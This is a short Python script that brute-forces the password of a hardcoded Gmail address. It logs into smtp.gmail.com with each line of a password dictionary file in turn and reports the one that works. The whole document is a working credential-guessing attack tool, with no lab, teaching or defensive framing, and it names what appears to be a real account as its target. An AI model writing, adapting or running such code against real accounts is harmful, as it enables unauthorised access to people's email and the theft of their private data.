import smtplib
from termcolor import colored

# manages a connection to the SMTP server
server = smtplib.SMTP(host="smtp.gmail.com", port=587)
# connect to the SMTP server as TLS mode ( for security )
server.ehlo()
f=open("dict.txt","r")
server.starttls()
# login to the email account
for password in f:
	try:
		print("trying password %s" %password)
		server.login("epitacs2020@gmail.com", password)
		print(colored("password found %s" %password,'green'))
		break
	except:
		print(colored("wrong password","red"))
